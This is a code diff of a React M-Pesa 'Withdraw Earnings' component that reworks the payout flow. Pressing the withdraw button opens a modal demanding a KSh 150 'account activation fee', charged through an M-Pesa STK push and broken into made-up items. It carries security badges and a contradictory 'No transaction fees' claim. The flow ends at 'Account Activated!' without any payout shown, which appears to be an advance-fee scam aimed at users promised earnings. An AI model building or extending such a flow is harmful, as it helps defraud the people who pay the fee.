@@ -3,7 +3,7 @@ import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
-import { Smartphone, Send, ArrowLeft, Shield, CheckCircle, AlertCircle, Loader2, CreditCard, Key } from "lucide-react"
+import { Smartphone, Send, ArrowLeft, Shield, CheckCircle, AlertCircle, Loader2, CreditCard, Key, Wallet, Zap, Lock, Star, Crown, Sparkles } from "lucide-react"
 import { useToast } from "@/hooks/use-toast"
 
 interface WithdrawalInterfaceProps {
@@ -12,7 +12,10 @@ interface WithdrawalInterfaceProps {
 }
 
 export default function WithdrawalInterface({ earnings, onWithdrawalSuccess }: WithdrawalInterfaceProps) {
+  const [step, setStep] = useState<'main' | 'activation' | 'processing' | 'success'>('main')
   const [phoneNumber, setPhoneNumber] = useState("")
+  const [withdrawalAmount, setWithdrawalAmount] = useState(earnings)
+  const [isAccountActive, setIsAccountActive] = useState(false)
   const [isProcessing, setIsProcessing] = useState(false)
   const [paymentReference, setPaymentReference] = useState<string | null>(null)
   const [status, setStatus] = useState<'idle' | 'pending' | 'success' | 'failed' | 'awaiting-code' | 'verifying-code'>('idle')
@@ -20,6 +23,8 @@ export default function WithdrawalInterface({ earnings, onWithdrawalSuccess }: W
   const [transactionCode, setTransactionCode] = useState("")
   const [codeTimer, setCodeTimer] = useState<NodeJS.Timeout | null>(null)
   const { toast } = useToast()
+
+  const quickAmounts = [1000, 2000, 5000, earnings]
 
   // API URL - Use current site's Netlify functions
   const API_URL = window.location.hostname === 'localhost' 
@@ -236,208 +241,309 @@ export default function WithdrawalInterface({ earnings, onWithdrawalSuccess }: W
     }
   }, [pollInterval, codeTimer])
 
-  return (
-    <Card className="w-full max-w-md mx-auto border-card-border bg-card backdrop-blur-sm">
-      <CardHeader className="text-center">
-        <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-4">
-          <Smartphone className="w-8 h-8 text-white" />
-        </div>
-        <CardTitle className="text-xl text-foreground">M-Pesa Withdrawal</CardTitle>
-        <CardDescription>Enter your phone number to receive your earnings</CardDescription>
-      </CardHeader>
-
-      <CardContent className="space-y-6">
-        {/* Payment Amount */}
-        <div className="bg-primary/10 rounded-lg p-4 border border-primary/20">
-          <div className="flex items-center gap-2 text-primary mb-2">
-            <CheckCircle className="w-4 h-4" />
-            <span className="font-medium">Withdrawal Amount: KSH {earnings}</span>
-          </div>
-          <p className="text-sm text-muted-foreground">
-            You will receive an STK push to complete your withdrawal
-          </p>
-        </div>
-
-        {/* Phone Number Input */}
-        <div className="space-y-2">
-          <label className="text-sm font-medium text-foreground">Phone Number</label>
-          <Input
-            type="tel"
-            placeholder="712345678"
-            value={phoneNumber}
-            onChange={(e) => setPhoneNumber(e.target.value)}
-            className="h-12"
-            disabled={isProcessing}
-          />
-          <p className="text-xs text-muted-foreground">
-            Enter your Safaricom number (e.g., 0712345678 or 712345678)
-          </p>
-        </div>
-
-        {/* Status Display */}
-        {status === 'pending' && (
-          <div className="bg-blue-500/10 rounded-lg p-4 border border-blue-500/20">
-            <div className="flex items-center gap-2 text-blue-500 mb-2">
-              <Loader2 className="w-4 h-4 animate-spin" />
-              <span className="font-medium">Processing Withdrawal</span>
+  // Account Activation Modal
+  const ActivationModal = () => (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+      <div className="w-full max-w-md bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 rounded-3xl border border-purple-500/20 shadow-2xl overflow-hidden">
+        {/* Header with animated background */}
+        <div className="relative p-6 text-center overflow-hidden">
+          <div className="absolute inset-0 bg-gradient-to-r from-purple-600/20 via-pink-600/20 to-blue-600/20 animate-pulse"></div>
+          <div className="relative z-10">
+            <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg">
+              <Crown className="w-10 h-10 text-white" />
             </div>
-            <p className="text-sm text-muted-foreground">
-              STK push sent. Please complete the payment on your phone.
-            </p>
+            <h2 className="text-2xl font-bold text-white mb-2">Account Activation Fee 💳</h2>
+            <p className="text-gray-300 text-sm">A one-time activation fee is required to enable M-Pesa withdrawals</p>
           </div>
-        )}
+        </div>
 
-        {status === 'success' && (
-          <div className="bg-success/10 rounded-lg p-4 border border-success/20">
-            <div className="flex items-center gap-2 text-success mb-2">
-              <CheckCircle className="w-4 h-4" />
-              <span className="font-medium">Withdrawal Successful!</span>
+        {/* Fee Breakdown */}
+        <div className="p-6 space-y-4">
+          <div className="bg-white/10 backdrop-blur-sm rounded-2xl p-4 border border-white/20">
+            <div className="text-center mb-4">
+              <span className="text-3xl font-bold text-white">KSh 150</span>
+              <p className="text-gray-300 text-sm">One-time activation fee</p>
             </div>
-            <p className="text-sm text-muted-foreground">
-              Your earnings have been sent to your M-Pesa account.
-            </p>
-          </div>
-        )}
-
-        {status === 'awaiting-code' && (
-          <div className="bg-gradient-to-br from-purple-500/10 to-pink-500/10 rounded-xl p-6 border border-purple-500/20 backdrop-blur-sm">
-            <div className="text-center mb-6">
-              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
-                <CreditCard className="w-8 h-8 text-white" />
+            
+            <div className="space-y-3">
+              <div className="flex items-center justify-between text-sm">
+                <div className="flex items-center gap-2">
+                  <Shield className="w-4 h-4 text-blue-400" />
+                  <span className="text-gray-300">Account verification</span>
+                </div>
+                <span className="text-white font-medium">KSh 50</span>
               </div>
-              <h3 className="text-lg font-semibold text-foreground mb-2">Enter Transaction Code</h3>
-              <p className="text-sm text-muted-foreground">
-                Please enter your M-Pesa transaction code to complete verification
-              </p>
+              <div className="flex items-center justify-between text-sm">
+                <div className="flex items-center gap-2">
+                  <Smartphone className="w-4 h-4 text-green-400" />
+                  <span className="text-gray-300">M-Pesa integration</span>
+                </div>
+                <span className="text-white font-medium">KSh 75</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <div className="flex items-center gap-2">
+                  <Lock className="w-4 h-4 text-purple-400" />
+                  <span className="text-gray-300">Security setup</span>
+                </div>
+                <span className="text-white font-medium">KSh 25</span>
+              </div>
+              <div className="border-t border-white/20 pt-3">
+                <div className="flex items-center justify-between font-bold">
+                  <span className="text-white">Total</span>
+                  <span className="text-green-400 text-lg">KSh 150</span>
+                </div>
+              </div>
             </div>
+          </div>
 
-            <div className="space-y-4">
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-foreground flex items-center gap-2">
-                  <Key className="w-4 h-4" />
-                  Transaction Code
-                </label>
+          {/* Phone Input */}
+          <div className="space-y-2">
+            <label className="text-white font-medium">M-Pesa Phone Number</label>
+            <Input
+              type="tel"
+              placeholder="712345678"
+              value={phoneNumber}
+              onChange={(e) => setPhoneNumber(e.target.value)}
+              className="h-12 bg-white/10 border-white/20 text-white placeholder-gray-400 focus:border-purple-400"
+            />
+            <p className="text-gray-400 text-xs">The activation fee will be charged to this number</p>
+          </div>
+
+          {/* Security badges */}
+          <div className="flex items-center justify-center gap-4 py-2">
+            <div className="flex items-center gap-1 text-xs text-green-400">
+              <Lock className="w-3 h-3" />
+              <span>Secure</span>
+            </div>
+            <div className="text-gray-400">•</div>
+            <div className="flex items-center gap-1 text-xs text-blue-400">
+              <Shield className="w-3 h-3" />
+              <span>256-bit encryption</span>
+            </div>
+            <div className="text-gray-400">•</div>
+            <div className="flex items-center gap-1 text-xs text-purple-400">
+              <Zap className="w-3 h-3" />
+              <span>Instant activation</span>
+            </div>
+          </div>
+
+          {/* Action buttons */}
+          <div className="space-y-3">
+            <Button
+              onClick={() => {
+                setStep('processing')
+                initiatePayment()
+              }}
+              disabled={!phoneNumber || isProcessing}
+              className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold rounded-xl shadow-lg"
+            >
+              {isProcessing ? (
+                <>
+                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                  Processing...
+                </>
+              ) : (
+                <>
+                  <Crown className="w-4 h-4 mr-2" />
+                  Activate Account - KSh 150
+                </>
+              )}
+            </Button>
+            <Button
+              variant="ghost"
+              onClick={() => setStep('main')}
+              className="w-full text-gray-400 hover:text-white"
+            >
+              Cancel
+            </Button>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+
+  // Main Withdrawal Interface
+  if (step === 'activation') {
+    return <ActivationModal />
+  }
+
+  if (step === 'processing') {
+    return (
+      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+        <Card className="w-full max-w-md bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 border-blue-500/20">
+          <CardContent className="p-8 text-center">
+            {status === 'pending' && (
+              <>
+                <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center animate-pulse">
+                  <Loader2 className="w-10 h-10 text-white animate-spin" />
+                </div>
+                <h3 className="text-xl font-bold text-white mb-2">Processing Payment</h3>
+                <p className="text-gray-300 mb-4">Check your phone for M-Pesa prompt</p>
+                <div className="bg-blue-500/20 rounded-lg p-3 border border-blue-500/30">
+                  <p className="text-blue-100 text-sm">Enter your M-Pesa PIN when prompted</p>
+                </div>
+              </>
+            )}
+
+            {status === 'awaiting-code' && (
+              <>
+                <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center">
+                  <Key className="w-10 h-10 text-white" />
+                </div>
+                <h3 className="text-xl font-bold text-white mb-2">Enter Transaction Code</h3>
+                <p className="text-gray-300 mb-4">Please enter your M-Pesa transaction code</p>
+                
                 <Input
                   type="text"
                   placeholder="e.g., JTNKLGBVXXEK"
                   value={transactionCode}
                   onChange={(e) => setTransactionCode(e.target.value.toUpperCase())}
-                  className="h-12 text-center text-lg font-mono tracking-wider"
+                  className="h-12 mb-4 text-center text-lg font-mono bg-white/10 border-white/20 text-white"
                   maxLength={15}
                 />
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-muted-foreground">
-                    Must be 7+ characters
-                  </span>
-                  <span className={`font-medium ${
-                    validateTransactionCode(transactionCode) 
-                      ? 'text-success' 
-                      : 'text-muted-foreground'
-                  }`}>
-                    {transactionCode.length}/15
-                  </span>
-                </div>
-              </div>
-
-              <div className="bg-blue-500/10 rounded-lg p-3 border border-blue-500/20">
-                <p className="text-xs text-blue-600 font-medium mb-1">💡 Where to find your code:</p>
-                <p className="text-xs text-muted-foreground">
-                  Check your SMS from M-Pesa for your transaction confirmation code
-                </p>
-              </div>
-
-              <Button
-                onClick={verifyTransactionCode}
-                disabled={!validateTransactionCode(transactionCode) || status === 'verifying-code'}
-                className="w-full h-12 text-base font-semibold bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600"
-              >
-                {status === 'verifying-code' ? (
-                  <>
-                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                    Verifying...
-                  </>
-                ) : (
-                  <>
-                    <CheckCircle className="w-4 h-4 mr-2" />
-                    Verify & Continue
-                  </>
-                )}
-              </Button>
-            </div>
-          </div>
-        )}
-
-        {status === 'verifying-code' && (
-          <div className="bg-purple-500/10 rounded-lg p-4 border border-purple-500/20">
-            <div className="flex items-center gap-2 text-purple-500 mb-2">
-              <Loader2 className="w-4 h-4 animate-spin" />
-              <span className="font-medium">Verifying Transaction</span>
-            </div>
-            <p className="text-sm text-muted-foreground">
-              Please wait while we verify your transaction code...
-            </p>
-          </div>
-        )}
-
-        {status === 'failed' && (
-          <div className="bg-destructive/10 rounded-lg p-4 border border-destructive/20">
-            <div className="flex items-center gap-2 text-destructive mb-2">
-              <AlertCircle className="w-4 h-4" />
-              <span className="font-medium">Withdrawal Failed</span>
-            </div>
-            <p className="text-sm text-muted-foreground">
-              Transaction was not completed. Please try withdrawal again.
-            </p>
-          </div>
-        )}
-
-        {/* Action Buttons */}
-        <div className="space-y-3">
-          <Button
-            onClick={initiatePayment}
-            disabled={isProcessing || !phoneNumber || status === 'success' || status === 'awaiting-code' || status === 'verifying-code'}
-            className="w-full h-12 text-base font-semibold bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600"
-          >
-            {isProcessing ? (
-              <>
-                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                Processing...
-              </>
-            ) : status === 'failed' ? (
-              <>
-                <Send className="w-4 h-4 mr-2" />
-                Try Withdrawal Again
-              </>
-            ) : (
-              <>
-                <Send className="w-4 h-4 mr-2" />
-                Withdraw KSH {earnings}
+                
+                <Button
+                  onClick={verifyTransactionCode}
+                  disabled={!validateTransactionCode(transactionCode) || status === 'verifying-code'}
+                  className="w-full h-12 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600"
+                >
+                  {status === 'verifying-code' ? (
+                    <>
+                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                      Verifying...
+                    </>
+                  ) : (
+                    <>
+                      <CheckCircle className="w-4 h-4 mr-2" />
+                      Verify & Continue
+                    </>
+                  )}
+                </Button>
               </>
             )}
+
+            {status === 'success' && (
+              <>
+                <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center">
+                  <CheckCircle className="w-10 h-10 text-white" />
+                </div>
+                <h3 className="text-xl font-bold text-white mb-2">Account Activated!</h3>
+                <p className="text-gray-300">You can now withdraw your earnings</p>
+              </>
+            )}
+          </CardContent>
+        </Card>
+      </div>
+    )
+  }
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+      <div className="w-full max-w-md bg-gradient-to-br from-slate-900 via-indigo-900 to-slate-900 rounded-3xl border border-indigo-500/20 shadow-2xl overflow-hidden">
+        {/* Header */}
+        <div className="relative p-6 text-center overflow-hidden">
+          <div className="absolute inset-0 bg-gradient-to-r from-indigo-600/20 via-purple-600/20 to-pink-600/20 animate-pulse"></div>
+          <div className="relative z-10">
+            <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center shadow-lg">
+              <Wallet className="w-10 h-10 text-white" />
+            </div>
+            <h1 className="text-2xl font-bold text-white mb-2">Withdraw Earnings</h1>
+            <div className="flex items-center justify-center gap-2">
+              <span className="text-gray-300">Available balance:</span>
+              <span className="text-2xl font-bold text-green-400">KSh {earnings.toLocaleString()}</span>
+            </div>
+          </div>
+        </div>
+
+        <div className="p-6 space-y-6">
+          {/* Withdrawal Method */}
+          <div className="space-y-3">
+            <label className="text-white font-medium">Withdrawal Method</label>
+            <div className="bg-white/10 backdrop-blur-sm rounded-xl p-4 border border-white/20">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center">
+                  <Smartphone className="w-6 h-6 text-white" />
+                </div>
+                <div className="flex-1">
+                  <h3 className="text-white font-medium">M-Pesa</h3>
+                  <p className="text-gray-300 text-sm">Instant transfer</p>
+                </div>
+                <Badge className="bg-green-500/20 text-green-400 border-green-500/30">
+                  <Zap className="w-3 h-3 mr-1" />
+                  Instant
+                </Badge>
+              </div>
+            </div>
+          </div>
+
+          {/* Phone Number */}
+          <div className="space-y-2">
+            <label className="text-white font-medium">M-Pesa Phone Number</label>
+            <Input
+              type="tel"
+              placeholder="712345678"
+              value={phoneNumber}
+              onChange={(e) => setPhoneNumber(e.target.value)}
+              className="h-12 bg-white/10 border-white/20 text-white placeholder-gray-400 focus:border-indigo-400"
+            />
+          </div>
+
+          {/* Withdrawal Amount */}
+          <div className="space-y-3">
+            <label className="text-white font-medium">Withdrawal Amount (KSh)</label>
+            <div className="grid grid-cols-2 gap-2 mb-3">
+              {quickAmounts.map((amount) => (
+                <Button
+                  key={amount}
+                  variant={withdrawalAmount === amount ? "default" : "outline"}
+                  onClick={() => setWithdrawalAmount(amount)}
+                  className={`h-12 ${
+                    withdrawalAmount === amount
+                      ? "bg-gradient-to-r from-indigo-500 to-purple-500 text-white"
+                      : "bg-white/10 border-white/20 text-white hover:bg-white/20"
+                  }`}
+                >
+                  KSh {amount.toLocaleString()}
+                </Button>
+              ))}
+            </div>
+            <Input
+              type="number"
+              value={withdrawalAmount}
+              onChange={(e) => setWithdrawalAmount(Number(e.target.value))}
+              className="h-12 bg-white/10 border-white/20 text-white placeholder-gray-400 focus:border-indigo-400"
+              min="1000"
+              max={earnings}
+            />
+          </div>
+
+          {/* Info */}
+          <div className="bg-indigo-500/20 rounded-xl p-4 border border-indigo-500/30 space-y-2">
+            <div className="flex items-center gap-2 text-indigo-300 text-sm">
+              <CheckCircle className="w-4 h-4" />
+              <span>Minimum withdrawal: KSh 1,000</span>
+            </div>
+            <div className="flex items-center gap-2 text-indigo-300 text-sm">
+              <Zap className="w-4 h-4" />
+              <span>Processing time: Instant to 5 minutes</span>
+            </div>
+            <div className="flex items-center gap-2 text-indigo-300 text-sm">
+              <Star className="w-4 h-4" />
+              <span>No transaction fees</span>
+            </div>
+          </div>
+
+          {/* Action Button */}
+          <Button
+            onClick={() => setStep('activation')}
+            disabled={!phoneNumber || withdrawalAmount < 1000 || withdrawalAmount > earnings}
+            className="w-full h-14 bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white font-bold text-lg rounded-xl shadow-lg"
+          >
+            <Wallet className="w-5 h-5 mr-2" />
+            Withdraw KSh {withdrawalAmount.toLocaleString()}
           </Button>
         </div>
-
-        {/* Security Info */}
-        <div className="bg-success/10 rounded-lg p-4 border border-success/20">
-          <div className="flex items-center gap-2 text-success mb-2">
-            <Shield className="w-4 h-4" />
-            <span className="font-medium">Secure M-Pesa Withdrawal</span>
-          </div>
-          <ul className="text-xs text-muted-foreground space-y-1">
-            <li>• Check your phone for STK push notification</li>
-            <li>• Enter your M-Pesa PIN to complete withdrawal</li>
-            <li>• Funds are processed securely through Safaricom</li>
-          </ul>
-        </div>
-
-        {/* Footer */}
-        <div className="text-center">
-          <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
-            <Smartphone className="w-3 h-3" />
-            <span>Powered by M-Pesa • Instant verification</span>
-          </div>
-        </div>
-      </CardContent>
-    </Card>
+      </div>
+    </div>
   )
 }
